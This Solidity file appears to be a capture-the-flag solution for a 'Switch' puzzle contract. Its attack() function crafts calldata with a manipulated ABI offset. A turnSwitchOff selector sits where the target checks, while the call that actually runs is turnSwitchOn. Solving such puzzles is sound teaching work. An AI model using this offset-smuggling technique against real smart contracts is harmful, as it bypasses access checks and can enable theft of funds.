// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
interface Switch {
    function switchOn() external returns (bool);
    function flipSwitch(bytes memory) external;
    function turnSwitchOn() external;
    function turnSwitchOff() external;
}
contract Solve {
    address target;
    constructor(address _target) {
        target = _target;
    }
    function attack() public {
        target.call(
            abi.encodePacked(
                Switch.flipSwitch.selector,
                abi.encode(96), // total offset size
                abi.encode(0x00), // dummy
                abi.encode(bytes4(keccak256("turnSwitchOff()"))),
                abi.encode(4), // real data size
                abi.encodeWithSelector(Switch.turnSwitchOn.selector)
            )
        );
    }
}